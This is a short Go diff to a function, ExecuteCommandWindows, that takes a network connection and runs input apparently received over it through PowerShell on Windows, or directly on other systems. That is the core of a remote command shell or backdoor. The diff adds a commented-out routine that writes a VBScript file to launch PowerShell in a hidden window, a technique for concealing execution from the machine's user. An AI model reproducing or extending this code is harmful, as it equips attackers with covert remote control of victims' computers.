@@ -42,7 +42,23 @@ func ExecuteCommandWindows(connection net.Conn) (err error) {
 			var cmd_instance *exec.Cmd
 
 			if runtime.GOOS == "windows" {
-				cmd_instance = exec.Command("powershell.exe", "/C", user_input)
+				/*
+					comm := "Dim shell,command" +
+						"\ncommand = \"powershell.exe -nologo -command " + "\"" +
+						"\nSet shell = CreateObject(\"WScript.Shell\")" +
+						"\nshell.Run command,0"
+
+					f, err := os.Create("comm.vbs")
+					if err != nil {
+						log.Fatal(err)
+					}
+					defer f.Close()
+					_, err2 := f.WriteString(comm)
+					if err2 != nil {
+						log.Fatal(err2)
+					}
+				*/
+				cmd_instance = exec.Command("powershell.exe", "/c", user_input)
 			} else {
 				cmd_instance = exec.Command(user_input)
 			}
